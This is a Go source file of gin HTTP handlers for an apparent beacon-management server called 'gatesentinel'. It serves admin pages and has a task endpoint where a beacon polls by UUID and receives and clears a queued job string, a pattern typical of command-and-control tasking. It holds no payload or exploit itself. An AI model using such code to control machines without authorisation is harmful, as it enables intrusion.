package handler

import (
	"gatesentinel/config"
	"gatesentinel/db"
	"gatesentinel/utils"
	"log"
	"net/http"

	"github.com/gin-gonic/gin"
)

// LoginPageHandler 登录页面
func LoginPageHandler(c *gin.Context) {
	c.File("static/html/admin/login.html")
}

// IndexPageHandler 首页
func IndexPageHandler(c *gin.Context) {
	c.Redirect(http.StatusFound, config.GlobalConfig.Routes.AdminPrefix+"/beacons")
}

// BeaconsPageHandler Beacon列表页面
func BeaconsPageHandler(c *gin.Context) {
	c.File("static/html/admin/beacons.html")
}

// DetailsPageHandler Beacon详情页面
func DetailsPageHandler(c *gin.Context) {
	c.File("static/html/admin/details.html")
}

// SettingsPageHandler 设置页面
func SettingsPageHandler(c *gin.Context) {
	c.File("static/html/admin/settings.html")
}

// TaskHandler 处理Beacon任务请求
func TaskHandler(c *gin.Context) {
	clientId := c.Query("clientId")
	if !utils.ValidateUUID(clientId) {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid client ID"})
		return
	}

	// 更新最后在线时间
	err := db.UpdateBeaconLastSeen(clientId)
	if err != nil {
		log.Printf("更新Beacon最后在线时间失败: %v", err)
	}

	// 获取任务
	beacon, err := db.GetBeaconByUUID(clientId)
	if err != nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "Beacon not found"})
		return
	}

	// 如果有任务，返回任务并清空任务
	if beacon.Job != "" {
		task := beacon.Job
		err = db.UpdateBeaconJob(clientId, "")
		if err != nil {
			log.Printf("清空任务失败: %v", err)
		}
		c.String(http.StatusOK, task)
		return
	}

	// 没有任务，返回空
	c.String(http.StatusOK, "")
}
